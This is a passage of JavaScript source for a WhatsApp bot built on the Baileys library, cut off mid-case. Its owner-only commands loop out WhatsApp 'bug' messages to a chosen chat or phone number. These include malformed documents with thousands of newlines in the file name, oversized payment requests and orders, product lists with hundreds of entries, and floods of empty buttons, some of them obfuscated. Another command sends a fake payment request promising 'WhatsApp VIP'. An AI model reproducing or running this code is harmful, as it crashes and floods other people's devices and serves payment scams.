ރ📄\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${mata}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
zyren.relayMessage(m.chat, document.message, { messageId: document.key.id })
}}
break
case "duc": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `‍🍷꙰͜͡𝐏𝐚𝐤𝐓𝐳𝐲💸̷⃨⃛\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${mata1}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
zyren.relayMessage(m.chat, document.message, { messageId: document.key.id })
}}
break
case "paymv": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "USD",
"amount1000": "88890",
"requestPaymentimage": messa.imageMessage,
"requestFrom": `${pushname}`,
"noteMessage": {
"extendedTextMessage": {
"text": `${notif3}`,
}
}}}), { userJid: m.chat, quoted: gcc })
zyren.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}}
break
case "paym": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} Jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "USD",
"amount1000": "707404",
"requestFrom": "@s.whatsapp.net",
"noteMessage": {
"extendedTextMessage": {
"text": `${notif4}`,
}
}}}), { userJid: m.chat, quoted: m })
zyren.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}}
break
case "vbuy": {
if (!isCreator) return onlyOwner()
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "USD",
"amount1000": "707404",
"requestFrom": "@s.whatsapp.net",
"noteMessage": {
"extendedTextMessage": {
"text": `CLICK BUTTON BAYAR UNTUK MENDAPATKAN WHATSAPP VIP & BOT FREE!!`,
}
}}}), { userJid: m.chat, quoted: m })
zyren.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
case "🔥":{
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Tzyl`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=["NAME","34783nWaGUx","70YCNYrF","OWNER","1184216mLjwdr","147066EAQNAA","sendMessage","6281214281312","771192XPifQJ","6285714170944","JAGOAN\x20OM?","45FHicsI","2213460MCRxLU","AH\x20SLEBEEW","350069CkDHKE","Anjay\x20Menger","https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2","94440ePvkzM","chat"];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb["push"](_0x1631cb["shift"]());}catch(_0x5d4c67){_0x1631cb["push"](_0x1631cb["shift"]());}}}(_0x3a23,0x5d93e),await zyren[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{"text":"","templateButtons":[{"callButton":{"displayText":_0x47bf3a(0x14c),"phoneNumber":_0x47bf3a(0x152)}},{"callButton":{"displayText":_0x47bf3a(0x14c),"phoneNumber":_0x47bf3a(0x150)}},{"urlButton":{"displayText":"GROUP\x20HW\x20MODS\x20WA","url":_0x47bf3a(0x159)}},{"quickReplyButton":{"displayText":"MY","id":_0x47bf3a(0x158)}},{"quickReplyButton":{"displayText":_0x47bf3a(0x149),"id":_0x47bf3a(0x156)}},{"quickReplyButton":{"displayText":"HW\x20MODS\x20WA","id":_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
case "ftroli": {
if (!isCreator) return onlyOwner()
var TESTKENJI = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
                  "orderId": "436664297902534",
                  "sellerJid": "6282143067466@s.whatsapp.net",
                  "itemCount": 9999999,
                  "status": "INQUIRY",
                  "surface": "CATALOG",
                  "message": `POWERED BY TZY`,
                  "orderTitle": "POWERED BY ZYREN",
                  "thumbnail": logonya,
                  "token": "AR6ew8v8oH4gt78Ufm/sMBCeaQJwJlDhOTto8qAZytAdQA=="
}
}), { userJid: m.chat, quoted: m })
zyren.relayMessage(m.chat, TESTKENJI.message, { messageId: TESTKENJI.key.id })
}
break
case "ngetrol": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
function _0x4279(){const _0x4c3178=["fromObject","Message","1847261837216262824","73652izvGmz","1847261837216262829","1910200oYNAKN","PAK\x20TZY","1847261837216262","331958AouuTv","key","7007318245952499","890188DtEJNR","0@s.whatsapp.net","1847261837216269","sendMessage","258issmFR","1210MrdGTJ","184726183721626282","36XHGsdh","184726183721626","156QxEJPM","2092328zHiLqt","18472618372162628","18472618372162627","56945YMXtkC","PRODUCT_LIST","chat","3309880sRCSRt","6281214281312@s.whatsapp.net"];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404["push"](_0x425404["shift"]());}catch(_0x103dcc){_0x425404["push"](_0x425404["shift"]());}}}(_0x4279,0xb8533),a=await zyren[_0x588892(0x204)](m[_0x588892(0x1f3)],{"react":{"key":{"remoteJid":m[_0x588892(0x1f3)],"fromMe":!![],"id":m[_0x588892(0x1ff)]["id"]}}}));let doko={"key":{"participant":_0x588892(0x202)},"message":{"documentMessage":{"title":"©\x20"+ownerName,"jpegThumbnail":thumb}}};var order=generateWAMessageFromContent(m["chat"],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({"listMessage":{"title":""+notif3,"description":_0x588892(0x1fc)+notif3,"thumbnail":logonya,"buttonText":"","listType":_0x588892(0x1f2),"productListInfo":{"productSections":[{"title":""+notif3,"products":[{"productId":"1847261837216269"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x203)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x203)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x203)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"1847261837216269"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x203)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x203)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x203)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"1847261837216269"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"1847261837216269"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x203)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x203)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"1847261837216262"},{"productId":"1847261837216262244"},{"productId":_0x588892(0x207)},{"productId":_0x588892(0x1fa)},{"productId":"1847261837216262829"},{"productId":_0x588892(0x1f8)},{"productId":_0x588892(0x207)},{"productId":_0x588892(0x207)},{"productId":"184726183721626282"},{"productId":_0x588892(0x20c)},{"productId":_0x588892(0x20c)},{"productId":_0x588892(0x1fd)},{"productId":"1847261837216262"},{"productId":_0x588892(0x1f0)},{"productId":_0x588892(0x1fd)},{"productId":"1847261837216262"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x1fd)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x203)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"1847261837216269"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"1847261837216269"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x203)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x1fd)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":"184726183721626"},{"productId":_0x588892(0x209)},{"productId":_0x588892(0x1fa)},{"productId":"1847261837216262824"},{"productId":_0x588892(0x207)},{"productId":_0x588892(0x207)},{"productId":_0x588892(0x207)},{"productId":_0x588892(0x20c)},{"productId":_0x588892(0x20c)},{"productId":"1847261837216262"},{"productId":"1847261837216262"},{"productId":"18472618372162627"},{"productId":_0x588892(0x1fd)},{"productId":_0x588892(0x1fd)},{"productId":"184726183721626"},{"productId":"184726183721626"},{"productId":"184726183721626"}]}],"headerImage":{"productId":_0x588892(0x200)},"businessOwnerJid":_0x588892(0x1f5)},"footerText":""+notif3}}),{"userJid":m[_0x588892(0x1f3)],"quoted":m});zyren["relayMessage"](m[_0x588892(0x1f3)],order["message"],{"messageId":order["key"]["id"]});
}
}
break
case "bugytta":{
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zyren.sendMessage(m.chat, {
text: "", 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
}
 break
 case "oncrash": {
if (!isCreator) return onlyOwner()
let buttons = [
{buttonId: `jdfjjfjde`, buttonText: { displayText: `𝙾𝙽𝙽` }, type: 1 },
{buttonId: `jejrjfjeir`, buttonText: { displayText: `𝙾𝙵𝙵` }, type: 1 },
]
let buttonMessage = {
image: thumb,
mimeType: "image/jpg",
caption: `Untuk Mengaktifkan Click Button On Dan Jika Ingin Di Nonaktifkan Click Button Off!!`,
footer: `Click On / Off`,
buttons: buttons,
headerType: 4
}
zyren.sendMessage(m.chat, buttonMessage, { quoted: tzy })
}
break
 case "qwe": {
if (isBan) return //sticBanLu(from)
const templateButtons = [
{index: 1, urlButton: {displayText: "𝐌𝐲 𝐂𝐡𝐞𝐧𝐞𝐥", url: youtube}}
]
const templateMessage = {
video:fs.readFileSync("./media/gambarnye/kkk.mp4"),
gifPlayback:true,
jpegThumbnail:logonya,
caption: `
hwje`,
footer: "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ",
templateButtons: templateButtons
}
zyren.sendMessage(m.chat, templateMessage)
}
break
 case "bugquick":{
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zyren.sendMessage(m.chat, {
text: "", 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
}
 break
 case "⚠️":{
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nContoh : ${command} 62xxx|10|1`)
setReply(`Gass🔥`)
num = q.split("|")[0]+"@s.whatsapp.net"
jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
zyren.sendMessage(num, {
text: "", 
templateButtons: [
